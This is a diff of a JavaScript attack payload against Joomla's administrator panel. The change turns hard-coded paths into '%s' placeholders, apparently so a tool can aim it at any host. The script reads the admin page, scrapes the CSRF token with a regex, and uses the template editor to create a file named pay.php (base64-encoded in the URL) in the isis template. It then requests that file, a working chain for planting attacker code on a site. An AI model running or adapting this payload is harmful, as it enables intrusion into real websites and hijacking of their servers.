@@ -8,7 +8,7 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-var page = httpGet("/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=");
+var page = httpGet("%s/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=");
 
 function httpPost(theUrl, csrftoken)
 {
@@ -31,12 +31,12 @@ function httpPost(theUrl, csrftoken)
 
 csrftoken = "null";
 
-httpPost("/administrator/index.php?option=com_templates&task=template.createFile&id=507&file=L3BheS5waHA=", csrftoken);
+httpPost("%s/administrator/index.php?option=com_templates&task=template.createFile&id=507&file=L3BheS5waHA=", csrftoken);
 
 //ik I fail at regex fuk u
 var regExp = /\/administrator\/index.php\?option=com_login&amp;task=logout&amp;([^)]+)\"/;
 var matches = regExp.exec(page);
 var csrftoken = matches[1].slice(0, 32);
 
-httpPost("/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=", csrftoken);
-httpGet("/administrator/templates/isis/pay.php");
+httpPost("%s/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=", csrftoken);
+httpGet("%s/administrator/templates/isis/pay.php");
